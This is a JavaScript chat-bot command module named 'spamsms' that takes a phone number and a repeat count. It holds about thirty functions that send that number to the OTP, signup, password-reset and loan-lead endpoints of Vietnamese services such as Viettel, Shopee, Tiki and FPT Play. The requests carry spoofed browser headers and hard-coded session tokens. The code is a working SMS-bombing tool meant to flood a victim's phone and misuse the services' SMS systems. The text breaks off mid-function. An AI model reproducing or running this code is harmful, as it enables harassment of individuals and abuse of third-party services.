const axios = require('axios');

module.exports.config = {
	name: "spamsms",
	version: "2.0.0",
	hasPermssion: 2,
	credits: "LocDev",
	description: "Spam SMS/OTP đến số điện thoại qua nhiều dịch vụ",
	commandCategory: "Admin",
	usages: "[số điện thoại] [số lần]",
	cooldowns: 60,
  usePrefix: true,
	dependencies: {
		"axios": ""
	}
};

// Tất cả các hàm gửi OTP
async function sendOTP_Sapo(phone) {
	try {
		const cookies = {
			'landing_page': 'https://www.sapo.vn/',
			'start_time': '07/30/2024 16:21:32',
			'lang': 'vi',
			'G_ENABLED_IDPS': 'google',
			'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
			'referral': 'https://accounts.sapo.vn/',
			'pageview': '7',
		};
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'dnt': '1',
			'origin': 'https://www.sapo.vn',
			'priority': 'u=1, i',
			'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({ phonenumber: phone });
		await axios.post('https://www.sapo.vn/fnb/sendotp', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Viettel(phone) {
	try {
		const cookies = {
			'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
			'redirectLogin': 'https://viettel.vn/myviettel',
			'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
		};
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json;charset=UTF-8',
			'DNT': '1',
			'Origin': 'https://viettel.vn',
			'Referer': 'https://viettel.vn/myviettel',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
			'X-Requested-With': 'XMLHttpRequest',
			'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
		};
		const jsonData = {
			phone: phone,
			typeCode: 'DI_DONG',
			actionCode: 'myviettel://login_mobile',
			type: 'otp_login',
		};
		await axios.post('https://viettel.vn/api/getOTPLoginCommon', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Medicare(phone) {
	try {
		const cookies = {
			'SERVER': 'nginx2',
			'_gcl_au': '1.1.481698065.1722327865',
			'_tt_enable_cookie': '1',
			'_ttp': 'sCpx7m_MUB9D7tZklNI1kEjX_05',
			'_gid': 'GA1.2.1931976026.1722327868',
			'_ga_CEMYNHNKQ2': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
			'_ga_8DLTVS911W': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
			'_ga_R7XKMTVGEW': 'GS1.1.1722327866.1.1.1722327876.50.0.0',
			'_ga': 'GA1.2.535777579.1722327867',
			'XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D',
			'medicare_session': 'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
		};
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json',
			'Origin': 'https://medicare.vn',
			'Referer': 'https://medicare.vn/login',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
			'X-XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=',
		};
		const jsonData = { mobile: phone, mobile_country_prefix: '84' };
		await axios.post('https://medicare.vn/api/otp', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_TV360(phone) {
	try {
		const cookies = {
			'img-ext': 'avif',
			'NEXT_LOCALE': 'vi',
			'session-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
			'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
			'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
			'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
			'G_ENABLED_IDPS': 'google',
		};
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'dnt': '1',
			'origin': 'https://tv360.vn',
			'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { msisdn: phone };
		await axios.post('https://tv360.vn/public/v1/auth/get-otp-login', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_DienMayXanh(phone) {
	try {
		const cookies = {
			'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
			'SvID': 'new2690|Zqilx|Zqilw',
			'mwgngxpv': '3',
			'.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM',
		};
		const headers = {
			'Accept': '*/*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'DNT': '1',
			'Origin': 'https://www.dienmayxanh.com',
			'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			phoneNumber: phone,
			isReSend: 'false',
			sendOTPType: '1',
			__RequestVerificationToken: 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
		});
		await axios.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_KingFoodMart(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
			'content-type': 'application/json',
			'domain': 'kingfoodmart',
			'origin': 'https://kingfoodmart.com',
			'referer': 'https://kingfoodmart.com/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
		};
		const jsonData = {
			operationName: 'SendOtp',
			variables: {
				input: {
					phone: phone,
					captchaSignature: 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
				},
			},
			query: 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
		};
		await axios.post('https://api.onelife.vn/v1/gateway/', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Mocha(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'Origin': 'https://video.mocha.com.vn',
			'Referer': 'https://video.mocha.com.vn/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
		};
		const params = { msisdn: phone, languageCode: 'vi' };
		await axios.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', null, { headers, params });
	} catch (e) {}
}

async function sendOTP_FPTPlay(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json; charset=UTF-8',
			'origin': 'https://fptplay.vn',
			'referer': 'https://fptplay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-did': 'A0EB7FD5EA287DBF',
		};
		const jsonData = { phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' };
		await axios.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_FPTPlay_Reset(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json; charset=UTF-8',
			'origin': 'https://fptplay.vn',
			'referer': 'https://fptplay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-did': 'A0EB7FD5EA287DBF',
		};
		const jsonData = { phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' };
		await axios.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Vieon(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
			'content-type': 'application/json',
			'origin': 'https://vieon.vn',
			'referer': 'https://vieon.vn/auth/?destination=/&page=/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const params = { platform: 'web', ui: '012021' };
		const jsonData = {
			username: phone,
			country_code: 'VN',
			model: 'Windows 10',
			device_id: 'f812a55d1d5ee2b87a927833df2608bc',
			device_name: 'Edge/127',
			device_type: 'desktop',
			platform: 'web',
			ui: '012021',
		};
		await axios.post('https://api.vieon.vn/backend/user/v2/register', jsonData, { headers, params });
	} catch (e) {}
}

async function sendOTP_GHN(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://sso.ghn.vn',
			'referer': 'https://sso.ghn.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { phone: phone, type: 'register' };
		await axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_LotteMart(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://www.lottemart.vn',
			'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { username: phone, case: 'register' };
		await axios.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_VayVND(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN',
			'content-type': 'application/json; charset=utf-8',
			'origin': 'https://vayvnd.vn',
			'referer': 'https://vayvnd.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'site-id': '3',
		};
		const jsonData = { login: phone, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' };
		await axios.post('https://api.vayvnd.vn/v2/users/password-reset', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Shopee(phone) {
	try {
		const cookies = {
			'_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
			'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
			'SPC_F': 'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
			'REC_T_ID': '23f51dde-355f-11ef-bcef-3eebbabc6162',
			'__LOCALE__null': 'VN',
			'csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
		};
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://shopee.vn',
			'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-api-source': 'pc',
			'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
			'x-requested-with': 'XMLHttpRequest',
			'x-shopee-language': 'vi',
		};
		const jsonData = {
			operation: 8,
			encrypted_phone: '',
			phone: phone,
			supported_channels: [1, 2, 3, 6, 0, 5],
			support_session: true,
		};
		await axios.post('https://shopee.vn/api/v4/otp/get_settings_v2', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_TheGioiDiDong(phone) {
	try {
		const cookies = {
			'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
			'SvID': 'beline173|ZqjdK|ZqjdJ',
			'mwgngxpv': '3',
		};
		const headers = {
			'Accept': '*/*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'DNT': '1',
			'Origin': 'https://www.thegioididong.com',
			'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			phoneNumber: phone,
			isReSend: 'false',
			sendOTPType: '1',
			__RequestVerificationToken: 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
		});
		await axios.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_FPTShop(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
			'content-type': 'application/json',
			'order-channel': '1',
			'origin': 'https://fptshop.com.vn',
			'referer': 'https://fptshop.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { fromSys: 'WEBKHICT', otpType: '0', phoneNumber: phone };
		await axios.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_WinMart(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'authorization': 'Bearer undefined',
			'content-type': 'application/json',
			'origin': 'https://winmart.vn',
			'referer': 'https://winmart.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-api-merchant': 'WCM',
		};
		const jsonData = {
			firstName: 'Nguyễn Quang Ngọc',
			phoneNumber: phone,
			masanReferralCode: '',
			dobDate: '2024-07-26',
			gender: 'Male',
		};
		await axios.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_VietLoan(phone) {
	try {
		const cookies = {
			'__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
			'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
		};
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://vietloan.vn',
			'referer': 'https://vietloan.vn/register',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			phone: phone,
			_token: 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
		});
		await axios.post('https://vietloan.vn/register/phone-resend', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Lozi(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'origin': 'https://lozi.vn',
			'referer': 'https://lozi.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-access-token': 'unknown',
			'x-city-id': '50',
			'x-lozi-client': '1',
		};
		const jsonData = { countryCode: '84', phoneNumber: phone };
		await axios.post('https://mocha.lozi.vn/v1/invites/use-app', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_F88(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://f88.vn',
			'referer': 'https://f88.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = {
			FullName: 'Nguyễn Văn A',
			Phone: phone,
			DistrictCode: '024',
			ProvinceCode: '02',
			AssetType: 'Car',
			IsChoose: '1',
			ShopCode: '',
			Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
			FormType: 1,
		};
		await axios.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Vinpearl(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://vinpearl.com',
			'referer': 'https://vinpearl.com/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-display-currency': 'VND',
		};
		const jsonData = { channel: 'vpt', username: phone, type: 1, OtpChannel: 1 };
		await axios.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Traveloka(phone) {
	try {
		let formattedPhone = phone.startsWith('09') ? '+84' + phone.slice(1) : phone;
		const cookies = {
			'tv-repeat-visit': 'true',
			'countryCode': 'VN',
			'tv_user': '{"authorizationLevel":100,"id":null}',
		};
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://www.traveloka.com',
			'referer': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-domain': 'user',
			'x-route-prefix': 'vi-vn',
		};
		const jsonData = {
			fields: [],
			data: { userLoginMethod: 'PN', username: formattedPhone },
			clientInterface: 'desktop',
		};
		await axios.post('https://www.traveloka.com/api/v2/user/signup', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_DongPlus(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'origin': 'https://dongplus.vn',
			'referer': 'https://dongplus.vn/user/registration/reg1',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { mobile_phone: phone };
		await axios.post('https://api.dongplus.vn/api/v2/user/check-phone', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Tiki(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
			'content-type': 'application/json',
			'origin': 'https://tiki.vn',
			'referer': 'https://tiki.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { phone: phone };
		await axios.post('https://tiki.vn/api/v2/users/otp/send', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Lazada(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.lazada.vn',
			'referer': 'https://www.lazada.vn/customer/account/login',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phoneNumber: phone, sendOtpType: 'REGISTER' };
		await axios.post('https://www.lazada.vn/graphql', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_VNPay(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://sandbox.vnpayment.vn',
			'referer': 'https://sandbox.vnpayment.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://sandbox.vnpayment.vn/paymentv2/vpcpay.html', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_VinID(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
